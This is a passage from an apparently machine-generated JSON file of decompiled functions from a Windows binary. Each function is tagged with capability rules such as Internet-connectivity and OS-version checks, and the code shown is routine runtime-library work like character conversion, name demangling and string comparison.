            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00403d7d(uint16_t *lpWideCharStr, uint8_t *lpMultiByteStr, uint32_t arg_10h, uint noname_3, uint *arg_18h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    unkbyte6 Var7;\n    uint32_t var_4h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    uVar1 = *lpMultiByteStr;\n    uVar4 = uVar1;\n    if (uVar1 == 0) {\n        *lpWideCharStr = 0;\n        return 0;\n    }\n    var_4h = uVar1;\n    if (arg_18h[2] != 0) {\ncode_r0x00484922:\n        *lpWideCharStr = uVar4 & 0xff;\n        return 1;\n    }\n    iVar3 = arg_18h[1];\n    if (iVar3 == 1) {\ncode_r0x004848fb:\n        uVar5 = 1;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*arg_18h, 9, lpMultiByteStr, 1, lpWideCharStr, 1);\n    }\n    else {\n        if (iVar3 != 2) {\n            if (iVar3 == 4) {\n                Var7 = fcn.0048497f(&var_4h, var_4h);\n                uVar4 = Var7 >> 0x20;\n                iVar3 = Var7;\n                if (iVar3 == 0) goto code_r0x00484922;\n                if (iVar3 < 3) {\n                    uVar6 = 1;\n                    uVar5 = var_4h;\n                    do {\n                        if (arg_10h <= uVar6) {\n                            return 0xfffffffe;\n                        }\n                        if ((lpMultiByteStr[uVar6] & 0xc0) != 0x80) goto code_r0x00484912;\n                        uVar5 = uVar5 << 6 | lpMultiByteStr[uVar6] & 0x3f;\n                        uVar6 = uVar6 + 1;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                    if (0x7ff < uVar5 - 0xd800) {\n                        *lpWideCharStr = uVar5;\n                        return uVar6;\n                    }\n                }\n                goto code_r0x00484912;\n            }\n            goto code_r0x004848fb;\n        }\n        uVar5 = 1;\n        if ((*((uVar1 >> 3) + 0xc + arg_18h) & 1 << (uVar1 & 7)) != 0) {\n            if (arg_10h == 1) {\n                return 0xfffffffe;\n            }\n            uVar5 = 2;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*arg_18h, 9, lpMultiByteStr, uVar5, lpWideCharStr, 1);\n    }\n    if (iVar3 != 0) {\n        return uVar5;\n    }\ncode_r0x00484912:\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 792
    },
    "00403d8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d8c(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 1) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x21;\n    }\n    else if (arg_8h - 2U < 2) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x22;\n        return;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00403d96": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403d96(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "00403dbe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403dbe(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 106
    },
    "00403dd7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403dd7(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *var_4h;\n    \n    if ((5 < arg_8h) || (arg_ch == 0)) {\n        return NULL;\n    }\n    piVar1 = fcn.00405088(1, 8);\n    var_4h = piVar1;\n    if (piVar1 == NULL) {\n        puVar2 = fcn.00403a35();\n        piVar1 = NULL;\n        *puVar2 = 0xc;\n        goto code_r0x004ae549;\n    }\n    arg_8h_00 = fcn.00405088(1, 0xb8);\n    iVar4 = arg_8h_00;\n    if (arg_8h_00 == 0) {\n        puVar2 = fcn.00403a35();\n        piVar1 = NULL;\n        *puVar2 = 0xc;\n    }\n    else {\n        puVar2 = fcn.00405088(1, 0x220);\n        if (puVar2 == NULL) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0xc;\ncode_r0x004ae535:\n            piVar1 = NULL;\n            puVar3 = puVar2;\n        }\n        else {\n            fcn.004add32(arg_8h_00, 0x571e78);\n            iVar4 = fcn.004ae890(arg_8h_00, arg_8h, arg_ch);\n            if (iVar4 == 0) {\ncode_r0x004ae525:\n                fcn.004053da(arg_8h_00);\n                iVar4 = 0;\n                fcn.0040697e(arg_8h_00);\n                goto code_r0x004ae535;\n            }\n            iVar4 = fcn.00405d80(*(arg_8h_00 + 8), puVar2);\n            if (iVar4 != 0) goto code_r0x004ae525;\n            *puVar2 = 1;\n            iVar4 = 0;\n            *piVar1 = arg_8h_00;\n            puVar3 = NULL;\n            piVar1[1] = puVar2;\n            var_4h = NULL;\n        }\n        fcn.0040640b(puVar3);\n    }\n    fcn.0040640b(iVar4);\ncode_r0x004ae549:\n    fcn.0040640b(var_4h);\n    return piVar1;\n}\n",
        "token_count": 617
    },
    "00403dff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00403dff(char *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint var_10h;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    fcn.004011fe(&var_8h);\n    if (var_4h == '\\x03') {\n        return NULL;\n    }\n    if ((var_4h == '\\x02') || (((*0x574460 & 0x1000) == 0 && (**0x574458 != '\\0')))) {\n        var_4h = var_4h & 0xffffff00;\n        ppiVar3 = fcn.00405aab(*0x57445c);\n        var_8h = *ppiVar3;\n    }\n    if (arg_8h == NULL) {\n        if (var_8h == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            pcVar2 = **var_8h;\n            (**0x578000)();\n            iVar4 = (*pcVar2)();\n        }\n        arg_ch = iVar4 + 1;\n        var_4h = arg_ch;\n        arg_8h = fcn.00406712(arg_ch);\n        if (arg_8h == NULL) {\n            return NULL;\n        }\n    }\n    if (var_8h == NULL) {\n        *arg_8h = '\\0';\n    }\n    else {\n        pcVar5 = arg_8h;\n        if (arg_8h == NULL) {\n            pcVar2 = **var_8h;\n            (**0x578000)();\n            iVar4 = (*pcVar2)();\n            var_4h = iVar4 + 1;\n            pcVar5 = fcn.0040528b(var_4h);\n            arg_ch = var_4h;\n            if (pcVar5 == NULL) goto code_r0x00492cda;\n        }\n        pcVar2 = *(*var_8h + 0xc);\n        (**0x578000)(pcVar5, pcVar5 + (arg_ch - 1));\n        puVar6 = (*pcVar2)();\n        *puVar6 = 0;\n    }\ncode_r0x00492cda:\n    cVar1 = *arg_8h;\n    pcVar5 = arg_8h;\n    pcVar7 = arg_8h;\n    while (cVar1 != '\\0') {\n        pcVar7 = pcVar7 + 1;\n        if (cVar1 == ' ') {\n            *pcVar5 = ' ';\n            for (; *pcVar7 == ' '; pcVar7 = pcVar7 + 1) {\n            }\n        }\n        else {\n            *pcVar5 = cVar1;\n        }\n        pcVar5 = pcVar5 + 1;\n        cVar1 = *pcVar7;\n    }\n    *pcVar5 = '\\0';\n    return arg_8h;\n}\n",
        "token_count": 703
    },
    "00403e04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403e04(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 1;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 244
    },
    "00403e54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00403e54(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX == 0) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_ch = fcn.00404313();\n            arg_ch = arg_ch + 1;\n            arg_8h = fcn.0040528b(arg_ch);\n            if (arg_8h == NULL) {\n                return NULL;\n            }\n        }\n        puVar1 = fcn.004020c7(arg_8h, arg_8h + arg_ch + -1);\n        *puVar1 = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 197
    },
    "00403e6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00403e6d(int32_t *param_1)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x578000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 110
    },
    "00403e8b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403e8b(uint *arg_8h)\n\n{\n    char *pcVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t arg_8h_01;\n    int32_t arg_ch;\n    uint var_2ch;\n    char *var_24h;\n    uint var_20h;\n    char *var_1ch;\n    code *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    pcVar1 = *0x574458 + 1;\n    arg_ch = **0x574458;\n    // switch table (16 cases) at 0x4924f2\n    switch(arg_ch) {\n    case 0x47:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        goto code_r0x004922ef;\n    case 0x4b:\n    case 0x4c:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n        goto code_r0x004924d5;\n    case 0x4d:\n        *0x574458 = pcVar1;\n        fcn.00405498(&var_24h);\n        pcVar1 = *0x574458;\n        if (var_20h < '\\x02') {\n            fcn.00403e8b(arg_8h);\n            goto code_r0x004924e0;\n        }\n        goto code_r0x004924d5;\n    case 0x4e:\n        var_24h = \"nullptr\";\n        arg_8h_00 = &var_24h;\n        var_20h = 7;\n        *0x574458 = pcVar1;\ncode_r0x00492218:\n        fcn.00402d47(arg_8h_00);\n        goto code_r0x004924e0;\n    case 0x52:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n        *0x574458 = pcVar1;\n        fcn.0040632f(&var_24h);\n        fcn.00403e54(&var_14h, 0x10);\n        uVar3 = fcn.00406799(&var_14h);\n        if (((*0x574460 & 0x4000) != 0) && (var_18h = *0x574468,  *0x574468 != NULL)) {\n            (**0x578000)(uVar3 & 0xfff);\n            arg_8h_01 = (*var_18h)();\n            if (arg_8h_01 != 0) {\n                var_18h = var_18h & 0xffffff00;\n                fcn.00404cd7(arg_8h_01);\n                goto code_r0x004924e0;\n            }\n        }\n        fcn.004055b5(&var_14h, 0x10, 0x5557ec, uVar3 & 0xfff);\n        var_18h = var_18h & 0xffffff00;\n        fcn.0040328d(&var_14h);\n        if ((arg_ch == 0x52) || (arg_ch == 0x54)) {\n            var_24h = \"`template-type-parameter-\";\ncode_r0x00492492:\n            var_20h = 0x19;\n        }\n        else {\n            if (arg_ch == 0x55) {\n                var_24h = \"`generic-class-parameter-\";\n                goto code_r0x00492492;\n            }\n            pcVar1 = *0x574458;\n            if (arg_ch != 0x56) goto code_r0x004924d5;\n            var_24h = \"`generic-method-parameter-\";\n            var_20h = 0x1a;\n        }\n        fcn.00402d47(&var_24h);\n        fcn.004053b7(&var_24h, &var_1ch);\n        uVar2 = 0x27;\n        goto code_r0x0049239a;\n    case 0x53:\n        *0x574458 = pcVar1;\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        goto code_r0x004924e0;\n    }\n    if (arg_ch != 0x46) {\n        if (arg_ch < 0x37) {\n            if (arg_ch == 0x36) {\n                *0x574458 = pcVar1;\n                fcn.00403fdf(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0) {\n                fcn.004017df(1);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x30) {\n                *0x574458 = pcVar1;\n                fcn.0040632f(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x31) {\n                if (*pcVar1 != '@') {\n                    var_1ch = NULL;\n                    var_18h = NULL;\n                    *0x574458 = pcVar1;\n                    fcn.00404557(0x26);\n                    uVar2 = fcn.00401d52(&var_24h);\n                    fcn.004053b7(arg_8h, uVar2);\n                    goto code_r0x004924e0;\n                }\n                var_1ch = \"NULL\";\n                arg_8h_00 = &var_1ch;\n                var_18h = 0x4;\n                *0x574458 = *0x574458 + 2;\n                goto code_r0x00492218;\n            }\n            if (arg_ch == 0x32) {\n                *0x574458 = pcVar1;\n                fcn.004068e3(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x34) {\n                *0x574458 = pcVar1;\n                fcn.004028a6(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x35) {\n                *0x574458 = pcVar1;\n                fcn.0040526d(arg_8h);\n                goto code_r0x004924e0;\n            }\n        }\n        else {\n            if (arg_ch == 0x37) {\n                *0x574458 = pcVar1;\n                fcn.004038be(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x38) {\n                *0x574458 = pcVar1;\n                fcn.00406889(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if ((arg_ch == 0x41) || (arg_ch == 0x42)) {\n                *0x574458 = pcVar1;\n                fcn.00401717(arg_8h, arg_ch);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x43) {\n                *0x574458 = pcVar1;\n                fcn.004058da(arg_8h);\n                goto code_r0x004924e0;\n            }\n            if (arg_ch == 0x45) {\n                *0x574458 = pcVar1;\n                fcn.00401d52(arg_8h);\n                goto code_r0x004924e0;\n            }\n        }\n        goto code_r0x004924d5;\n    }\ncode_r0x004922ef:\n    var_1ch = NULL;\n    var_18h = NULL;\n    *0x574458 = pcVar1;\n    fcn.00404557(0x7b);\n    if (((arg_ch == 0x48) || (arg_ch == 0x49)) || (arg_ch == 0x4a)) {\n        uVar2 = fcn.00401d52(&var_24h);\n        fcn.00402eeb(uVar2);\n        fcn.00403d55(0x2c);\n    }\n    if (arg_ch == 0x46) {\ncode_r0x00492365:\n        uVar2 = fcn.0040632f(&var_24h);\n        fcn.00402eeb(uVar2);\n        fcn.00403d55(0x2c);\ncode_r0x00492382:\n        uVar2 = fcn.0040632f(&var_24h);\n        fcn.00402eeb(uVar2);\n    }\n    else {\n        if (arg_ch == 0x47) {\ncode_r0x00492348:\n            uVar2 = fcn.0040632f(&var_24h);\n            fcn.00402eeb(uVar2);\n            fcn.00403d55(0x2c);\n            goto code_r0x00492365;\n        }\n        if (arg_ch == 0x48) goto code_r0x00492382;\n        if (arg_ch == 0x49) goto code_r0x00492365;\n        if (arg_ch == 0x4a) goto code_r0x00492348;\n    }\n    uVar2 = 0x7d;\ncode_r0x0049239a:\n    fcn.0040330f(arg_8h, uVar2);\ncode_r0x004924e0:\n    fcn.004030bc(var_2ch);\n    return;\ncode_r0x004924d5:\n    *0x574458 = pcVar1;\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    goto code_r0x004924e0;\n}\n",
        "token_count": 2275
    },
    "00403e95": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __fastcall fcn.00403e95(int32_t **param_1)\n\n{\n    int32_t **var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 == NULL) {\n        var_ch = param_1 + 1;\n    }\n    else {\n        var_ch = *param_1;\n    }\n    return var_ch;\n}\n",
        "token_count": 89
    },
    "00403f08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403f08(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uVar6 = 0;\n    var_2h._0_1_ = '\\x01';\n    *0x574465 = 1;\n    do {\n        pcVar3 = *0x574458;\n        cVar1 = **0x574458;\n        if ((cVar1 == '\\0') || (cVar1 == '@')) break;\n        var_14h = 0;\n        var_10h = 0;\n        var_2h._1_1_ = '\\0';\n        if (cVar1 - 0x30U < 10) {\n            *0x574458 = *0x574458 + 1;\n            piVar4 = fcn.00401f32(&fcn.00403f08::var_24h, cVar1 - 0x30U);\n            iVar7 = *piVar4;\n            iVar5 = piVar4[1];\n            var_14h = iVar7;\n            var_10h = iVar5;\n            goto code_r0x00491ebf;\n        }\n        if (cVar1 == '$') {\n            if ((*0x574458)[1] != '$') {\ncode_r0x00491e25:\n                if ((**0x574458 != '$') || ((*0x574458)[1] == '$')) goto code_r0x00491e69;\n                *0x574458 = *0x574458 + 1;\n                piVar4 = fcn.00403e8b(&fcn.00403f08::var_2ch);\n                goto code_r0x00491e72;\n            }\n            cVar1 = (*0x574458)[2];\n            if (cVar1 == '$') {\n                if ((*0x574458)[3] != 'V') goto code_r0x00491e25;\n                *0x574458 = *0x574458 + 4;\n            }\n            else {\n                if (cVar1 == 'U') {\ncode_r0x00491e45:\n                    *0x574458 = *0x574458 + 3;\n                    goto code_r0x00491e25;\n                }\n                if (cVar1 != 'V') {\n                    if (cVar1 == 'W') {\n                        var_2h._1_1_ = '\\x01';\n                        goto code_r0x00491e45;\n                    }\n                    if (cVar1 != 'Z') goto code_r0x00491e25;\n                }\n                *0x574458 = *0x574458 + 3;\n            }\n        }\n        else {\ncode_r0x00491e69:\n            piVar4 = fcn.00405498(&fcn.00403f08::var_34h);\ncode_r0x00491e72:\n            piVar2 = *0x574454;\n            iVar5 = piVar4[1];\n            iVar7 = *piVar4;\n            var_14h = iVar7;\n            var_10h = iVar5;\n            if ((*0x574458 - pcVar3 < 2) || (**0x574454 == 9)) {\ncode_r0x00491ebf:\n                if (iVar7 != 0) {\n                    if (var_2h == '\\0') {\n                        fcn.00403d55(0x2c);\n                    }\n                    fcn.00402eeb(0x491edf);\n                    uVar6 = var_8h;\n                    if (var_2h._1_1_ != '\\0') {\n                        var_1ch = 0x5557e0;\n                        var_18h = 3;\n                        fcn.00405d71(&fcn.00403f08::var_1ch);\n                        uVar6 = var_8h;\n                    }\n                    goto code_r0x00491f0f;\n                }\n            }\n            else if (iVar7 != 0) {\n                piVar4 = fcn.0040528b(8);\n                if (piVar4 != NULL) {\n                    *piVar4 = iVar7;\n                    piVar4[1] = iVar5;\n                    *piVar2 = *piVar2 + 1;\n                    piVar2[*piVar2 + 1] = piVar4;\n                }\n                goto code_r0x00491ebf;\n            }\n            uVar6 = var_8h;\n            if ('\\x01' < iVar5) {\n                arg_8h[1] = 0;\n                *arg_8h = 0;\n                *(arg_8h + 1) = 2;\n                return;\n            }\n        }\ncode_r0x00491f0f:\n        var_2h._0_1_ = '\\0';\n    } while (uVar6 == '\\0');\n    *0x574465 = 0;\n    *arg_8h = var_ch;\n    arg_8h[1] = uVar6;\n    return;\n}\n",
        "token_count": 1261
    },
    "00403f17": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpLocaleName\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00403f17(uint arg_8h, uint dwCmpFlags, uint8_t *arg_10h, int32_t arg_14h, uint8_t *arg_18h, int32_t arg_1ch, \n            uint CodePage)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack92;\n    uint uStack88;\n    uint8_t *puStack84;\n    int32_t iStack80;\n    uint var_40h;\n    uint lpLocaleName;\n    uint var_30h;\n    uint var_2ch;\n    uint cchWideChar;\n    uint *lpString1;\n    uint var_20h;\n    uint lpMultiByteStr;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if (arg_14h < 1) {\n        if (arg_14h < -1) goto code_r0x0048509d;\n    }\n    else {\n        iStack80 = 0x484e7c;\n        arg_14h = fcn.00402838(arg_10h, arg_14h);\n    }\n    if (arg_1ch < 1) {\n        if (arg_1ch < -1) goto code_r0x0048509d;\n    }\n    else {\n        iStack80 = 0x484e9c;\n        arg_1ch = fcn.00402838(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if ((arg_14h == arg_1ch) || ((1 < arg_1ch || (1 < arg_14h)))) goto code_r0x0048509d;\n        iStack80 = 0x484eda;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if (iVar1 == 0) goto code_r0x0048509d;\n        if (0 < arg_14h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &fcn.00403f17::var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_10h < *puVar2 || (*(puVar2 + 1) < *arg_10h)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x0048509d;\n        }\n        if (0 < arg_1ch) {\n            if ((1 < lpCPInfo) && (puVar2 = &fcn.00403f17::var_12h,  var_12h != 0)) {\n                while (*(puVar2 + 1) != 0) {\n                    if (((*puVar2 <= *arg_18h) && (*arg_18h <= *(puVar2 + 1))) || (puVar2 = puVar2 + 2,  *puVar2 == 0))\n                    break;\n                }\n            }\n            goto code_r0x0048509d;\n        }\n    }\n    puStack84 = arg_10h;\n    uStack88 = 9;\n    uStack92 = CodePage;\n    puVar2 = &stack0xffffffa4;\n    iStack80 = arg_14h;\n    iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar1 == 0) goto code_r0x0048509d;\n    uVar3 = iVar1 * 2 + 8;\n    uVar3 = -(iVar1 * 2 < uVar3) & uVar3;\n    if (uVar3 != 0) {\n        if (uVar3 < 0x401) {\n            fcn.004034f4();\n            lpString1 = &stack0xffffffa4;\n            if (*0x10 != 0x5c) {\n                uStack92 = 0xcccc;\ncode_r0x00484fb6:\n                lpString1 = puVar2 + 2;\n            }\n        }\n        else {\n            puVar2 = fcn.00401596(uVar3);\n            lpString1 = puVar2;\n            if (puVar2 != NULL) {\n                *puVar2 = 0xdddd;\n                goto code_r0x00484fb6;\n            }\n        }\n        if ((lpString1 != NULL) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 1, arg_10h, arg_14h, lpString1, iVar1), \n           iVar4 != 0)) {\n            puVar2 = &stack0xffffffa4;\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 9, arg_18h, arg_1ch, 0, 0);\n            if (iVar4 != 0) {\n                uVar3 = iVar4 * 2 + 8;\n                uVar3 = -(iVar4 * 2 < uVar3) & uVar3;\n                if (uVar3 != 0) {\n                    if (uVar3 < 0x401) {\n                        fcn.004034f4();\n                        if (*0x10 != 0x5c) {\n                            uStack92 = 0xcccc;\n                            puVar2 = &stack0xffffffa4;\ncode_r0x0048503a:\n                            puVar2 = puVar2 + 2;\n                        }\n                    }\n                    else {\n                        puVar2 = fcn.00401596(uVar3);\n                        if (puVar2 != NULL) {\n                            *puVar2 = 0xdddd;\n                            goto code_r0x0048503a;\n                        }\n                    }\n                    if ((puVar2 != NULL) &&\n                       (iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                          (CodePage, 1, arg_18h, arg_1ch, puVar2, iVar4),  iVar5 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_CompareStringEx)\n                                  (arg_8h, dwCmpFlags, lpString1, iVar1, puVar2, iVar4, 0, 0, 0);\n                    }\n                }\n                fcn.00403828();\n            }\n        }\n    }\n    fcn.00403828();\ncode_r0x0048509d:\n    fcn.004030bc(arg_8h);\n    return;\n}\n",
        "token_count": 1539
    },
    "00403f35": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403f35(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 36
    },
    "00403fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
